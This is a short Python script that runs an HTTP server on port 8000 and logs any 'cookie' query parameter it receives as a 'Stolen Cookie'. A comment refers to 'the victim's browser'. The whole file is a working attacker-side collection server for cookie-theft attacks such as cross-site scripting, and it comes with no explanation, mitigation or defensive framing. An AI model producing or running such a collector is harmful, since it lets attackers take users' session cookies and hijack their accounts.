from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class CaptureServer(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        cookie = urllib.parse.parse_qs(query).get('cookie', [''])[0]
        
        if cookie:
            print(f"Stolen Cookie: {cookie}")
            
        # Send a response to the victim's browser
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Received')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), CaptureServer)
    print('Listening on port 8000...')
    server.serve_forever()
